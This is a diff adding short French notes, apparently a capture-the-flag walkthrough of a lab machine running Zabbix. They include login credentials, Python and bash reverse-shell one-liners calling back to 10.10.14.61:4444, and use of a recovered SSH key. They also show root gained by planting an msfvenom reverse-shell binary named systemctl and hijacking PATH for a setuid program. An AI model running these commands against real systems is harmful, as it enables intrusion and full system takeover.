@@ -1,0 +1,31 @@
+http://10.10.10.108/zabbix
+user: zapper
+password: zapper
+
+changer le groupe de zapper pour qu'il puisse se conencter au GUI
+cmd : zabbix-cli
+
+script : python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+doc zabbix
+bash -c 'bash -i >& /dev/tcp/10.10.14.61/4444 0>&1' </dev/null >/dev/null 2>/dev/null &
+monitoring/latest data : click sur zabbix
+
+2envs docker/machine 
+
+sur la machine pour dézip le fichier dans le /home/zapper le password est : ZippityDoDah
+
+on essaye : su zapper password : ZippityDoDah and we good to go
+
+on a pu acceder au .ssh on a donc la id_rsa :
+ssh -i id_rsa zapper@10.10.10.108
+
+/home/zapper/utils 
+-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service*
+SETUID bit on crée un payload avec msfvenom qu'on appelle systemctl car le prog utilise systemctl :
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.14.61 LPORT=4444 -f elf > systemctl
+
+on change le path : export PATH=.
+puis suffit de lancer le programme qui va lancer notre systemctl a la place de celui de la machine
+
+Got root
